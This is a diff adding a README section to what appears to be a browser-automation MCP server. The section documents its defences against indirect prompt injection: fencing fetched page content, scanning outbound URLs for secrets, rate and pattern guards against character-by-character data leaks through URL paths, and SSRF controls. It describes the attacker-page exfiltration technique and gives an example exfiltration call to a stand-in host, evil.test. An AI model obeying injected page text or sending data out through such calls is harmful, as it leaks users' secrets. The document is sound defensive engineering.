@@ -120,6 +120,40 @@ Beyond the basic scaffold, three `suite_*` tools carry a full, project-agnostic 
 
 `suite_scaffold` and `suite_audit` are local-only (remote-denylisted) like the session tools; `suite_methodology` is available everywhere.
 
+## Untrusted content and prompt injection
+
+Every page this server fetches is controlled by somebody else. A page carrying instructions aimed at the model reading it is indirect prompt injection, and no known mitigation fully prevents it. What follows is what this server does about it, and what it does not fix.
+
+The technique is called spotlighting (Hines et al., Microsoft Research, arXiv:2403.14720). This server uses its delimiting mode, which fences untrusted content inside explicit delimiters with a warning in the opening tag. The project's internal name for the control is provenance framing. The paper's other two modes were considered and rejected. Datamarking was dropped for token cost on large documents and because it mangles code blocks and the quoted citation text `web_fetch` exists to produce. Encoding was not implemented.
+
+### What gets marked
+
+`web_fetch` splits its output in two. The server's own fields (`fetchStatus`, `error`, `note`, `appraisalRequested`) sit outside the fence. Page-derived fields (`text`, `citation`, `cms`, `links`, `references`) go inside an `<untrusted-content>` delimiter with the warning in the opening tag. The `error` field stays outside on purpose. Its strings are actionable guidance from the server itself ("capture it with `session_login` first"), and fencing those would tell the model to ignore its own tool's instructions.
+
+The `browser_*` tools get the one-line `UNTRUSTED_NOTICE` appended to any result that carries page content. `browser_take_screenshot` gets a shorter label placed before the image block instead. That label names no URL. The upstream result carries no page URL at that point, and a cached last-navigated value goes stale on any click, redirect, form submit, or `browser_navigate_back`. A confidently wrong provenance claim is worse than an absent one. `browser_close` and `browser_resize` return no page content and are unmarked.
+
+### Outbound exfiltration guards
+
+All outbound fetches pass through `guardOutbound` (`src/exfil.ts`), a single chokepoint shared by `web_fetch` and the upstream `browser_*` tool-call path. `browser_navigate` cannot route around what `web_fetch` enforces.
+
+`scanForSecrets` refuses any URL whose path, query, or fragment contains a known secret value from `secrets.env` or captured storageState cookies. It matches raw, URL-encoded, base64, and base64url forms, and reports the key name in the refusal, never the value.
+
+A per-domain velocity cap limits distinct URLs per registrable domain in a rolling window (default 25 per 10 minutes). Alongside it, an alphabet-signature detector fires on 6 or more URLs from one domain that vary only in a short terminal path segment, subdomain label, or query value. Both guards target the "Memory Heist" shape, where an attacker page instructs the model to spell out private data one character at a time through URL paths.
+
+Localhost, RFC1918, `.local`, and `.internal` hosts are exempt from the velocity guards. Debugging local dev servers is the package's primary job, and a guard that throttles localhost would just be switched off.
+
+Escape hatches are environment variables (`PLAYWRIGHT_MCP_FETCH_LIMIT`, `PLAYWRIGHT_MCP_DISABLE_EXFIL_GUARD`), never tool arguments. An injected page can talk the model into passing a flag. It cannot reach the operator's shell.
+
+### Remote instance hardening
+
+On the remote surface (`PLAYWRIGHT_MCP_PUBLIC_URL` set), `assertEgressAllowed` blocks targets that resolve to private or metadata addresses. Per-hop redirect re-validation catches redirect chains that land on a private address after the initial URL passed. That re-validation covers `web_fetch`'s own page only. Upstream `browser_*` redirect hops are not reachable from the proxy, because upstream owns that page and this server holds no Playwright Page handle for it. The OS-level nftables egress block ([docs/REMOTE-CONNECTOR.md](docs/REMOTE-CONNECTOR.md) section 6) is the primary SSRF control. The in-process checks are the backstop.
+
+Tools are stripped by tier. `browser_run_code_unsafe`, `browser_file_upload`, `session_scaffold_tests`, `suite_scaffold`, and `suite_audit` are denied on every non-stdio surface. `session_login`, `session_status`, `session_solve_challenge`, and `session_attach` are denied on the cloud (OAuth) surface too. Filtering hits both `tools/list` and `tools/call`.
+
+### What this does not fix
+
+None of this is a solution. A single `web_fetch("https://evil.test/?d=<base64>")` defeats every layer here except `scanForSecrets`, and `scanForSecrets` only knows values this package can enumerate. Nothing here changes whether the model chooses to comply with injected text. These guards raise the cost of the naive drip-exfil variant. That is what they do.
+
 ## Remote connector for claude.ai
 
 Everything above is the local setup. The server runs over stdio for Claude Code on your own machine, and that's the default. Nothing changes unless you turn this on.
